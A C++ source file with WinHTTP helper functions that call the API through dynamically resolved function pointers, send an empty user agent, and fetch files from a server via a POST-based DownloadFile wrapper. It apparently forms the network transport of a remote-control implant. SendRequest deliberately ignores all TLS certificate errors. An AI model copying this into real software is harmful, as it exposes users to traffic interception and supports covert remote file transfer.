#include "core/system.hpp"

namespace System::Http
{
	WinHttpHandlers InitRequest(
		Procs::PPROCS pProcs,
		LPCWSTR lpHost,
		INTERNET_PORT nPort
	) {
		HINTERNET hSession = NULL;
		HINTERNET hConnect = NULL;

		hSession = pProcs->lpWinHttpOpen(
			L"",
			WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
			WINHTTP_NO_PROXY_NAME,
			WINHTTP_NO_PROXY_BYPASS, 0
		);
		if (!hSession) {
			return {hSession, hConnect};
		}

		hConnect = pProcs->lpWinHttpConnect(hSession, lpHost, nPort, 0);
		return {hSession, hConnect};
	}

	WinHttpResponse SendRequest(
		Procs::PPROCS pProcs,
		HINTERNET hConnect,
		LPCWSTR lpHost,
		INTERNET_PORT nPort,
		LPCWSTR lpPath,
		LPCWSTR lpMethod,
		LPCWSTR lpHeaders,
		LPVOID lpData,
		DWORD dwDataLength
	) {
		BOOL bResult = FALSE;
		HINTERNET hRequest = NULL;
		DWORD dwSecFlags = 0;
		DWORD dwDataWrite = 0;
		DWORD dwStatusCode = 0;
		DWORD dwStatusCodeSize = sizeof(dwStatusCode);

		hRequest = pProcs->lpWinHttpOpenRequest(
			hConnect,
			lpMethod,
			lpPath,
			NULL,
			WINHTTP_NO_REFERER,
			WINHTTP_DEFAULT_ACCEPT_TYPES,
			WINHTTP_FLAG_SECURE
		);
		if (!hRequest) {
			return {FALSE, hRequest, 0};
		}

		dwSecFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
					SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE |
					SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
					SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;

		bResult = pProcs->lpWinHttpSetOption(
			hRequest,
			WINHTTP_OPTION_SECURITY_FLAGS,
			&dwSecFlags,
			sizeof(DWORD)
		);
		if (!bResult) {
			return {FALSE, hRequest, 0};
		}

		if (!lpHeaders)
		{
			lpHeaders = WINHTTP_NO_ADDITIONAL_HEADERS;
		}

		bResult = pProcs->lpWinHttpSendRequest(
			hRequest,
			lpHeaders,
			lpHeaders ? -1 : 0,
			WINHTTP_NO_REQUEST_DATA,
			0,
			dwDataLength,
			0
		);
		if (!bResult) {
			return {FALSE, hRequest, 0};
		}

		if (lpData) {
			bResult = pProcs->lpWinHttpWriteData(
				hRequest,
				lpData,
				dwDataLength,
				&dwDataWrite
			);
		}

		bResult = pProcs->lpWinHttpReceiveResponse(hRequest, NULL);
		if (!bResult) {
			return {FALSE, hRequest, 0};
		}

		bResult = pProcs->lpWinHttpQueryHeaders(
			hRequest, 
			WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, 
			WINHTTP_HEADER_NAME_BY_INDEX, 
			&dwStatusCode,
			&dwStatusCodeSize,
			WINHTTP_NO_HEADER_INDEX
		);
		if (!bResult) {
			return {FALSE, hRequest, 0};
		}

		return {bResult, hRequest, dwStatusCode};
	}

	// Read response as bytes.
	std::vector<BYTE> ReadResponseBytes(
		Procs::PPROCS pProcs,
		HINTERNET hRequest
	) {
		std::vector<BYTE> respBytes;

		DWORD dwSize = 0;
		DWORD dwDownloaded = 0;
		BYTE* pBuffer = NULL;

		do
		{
			dwSize = 0;

			if (!pProcs->lpWinHttpQueryDataAvailable(hRequest, &dwSize))
			{
				return respBytes;
			}

			// No more available data.
			if (!dwSize)
			{
				return respBytes;
			}

			pBuffer = new BYTE[dwSize];
			if (!pBuffer)
			{
				return respBytes;
			}

			ZeroMemory(pBuffer, dwSize);
			if (!pProcs->lpWinHttpReadData(
				hRequest,
				pBuffer,
				dwSize,
				&dwDownloaded
			)) {
				delete[] pBuffer;
				return respBytes;
			}

			respBytes.insert(respBytes.end(), pBuffer, pBuffer + dwDownloaded);

			delete[] pBuffer;
		} while (dwSize > 0);
		
		return respBytes;
	}

	BOOL WriteResponseData(
		Procs::PPROCS pProcs,
		HINTERNET hRequest,
		const std::wstring& outFile
	) {
		DWORD dwSize = 0;
		DWORD dwRead = 0;
		LPSTR pszOutBuffer;

		// std::ofstream outFile(sFile, std::ios::binary);
		HANDLE hFile = CreateFileW(
			outFile.c_str(),
			GENERIC_WRITE,
			0,
			NULL,
			CREATE_ALWAYS,
			FILE_ATTRIBUTE_NORMAL,
			NULL
		);
		if (hFile == INVALID_HANDLE_VALUE)
		{
			return FALSE;
		}

		do
		{
			if (!pProcs->lpWinHttpQueryDataAvailable(hRequest, &dwSize))
			{
				break;
			}
			if (!dwSize)
			{
				break;
			}

			pszOutBuffer = new char[dwSize+1];
			if (!pszOutBuffer)
			{
				break;
			}

			// Read the data
			ZeroMemory(pszOutBuffer, dwSize+1);
			if (!pProcs->lpWinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwRead))
			{
				// Could not read data.
			}
			else
			{
				DWORD dwWritten;
				if (!WriteFile(hFile, pszOutBuffer, dwRead, &dwWritten, NULL))
				{
					return FALSE;
				}
			}

			delete [] pszOutBuffer;

			if (!dwRead)
				break;
		} while (dwSize > 0);

		// outFile.close();
		CloseHandle(hFile);

		return TRUE;
	}

	// Wrapper for send&read&write response data
	BOOL DownloadFile(
		Procs::PPROCS pProcs,
		HINTERNET hConnect,
		LPCWSTR lpHost,
		INTERNET_PORT nPort,
		LPCWSTR lpPath,
		const std::wstring& wSrc,
		const std::wstring& wDest
	) {
		std::string sSrc = Utils::Convert::UTF8Encode(wSrc);

		WinHttpResponse resp = SendRequest(
			pProcs,
			hConnect,
			lpHost,
			nPort,
			lpPath,
			L"POST",
			L"",
			(LPVOID)sSrc.c_str(),
			(DWORD)strlen(sSrc.c_str())
		);
		if (!resp.bResult || resp.dwStatusCode != 200)
		{
			return {};
		}

		if (!WriteResponseData(pProcs, resp.hRequest, wDest))
		{
			return FALSE;
		}

		return TRUE;
	}

	VOID WinHttpCloseHandles(
		Procs::PPROCS pProcs,
		HINTERNET hSession,
		HINTERNET hConnect,
		HINTERNET hRequest
	) {
		if (hRequest) pProcs->lpWinHttpCloseHandle(hRequest);
		if (hConnect) pProcs->lpWinHttpCloseHandle(hConnect);
		if (hSession) pProcs->lpWinHttpCloseHandle(hSession);
	}
}

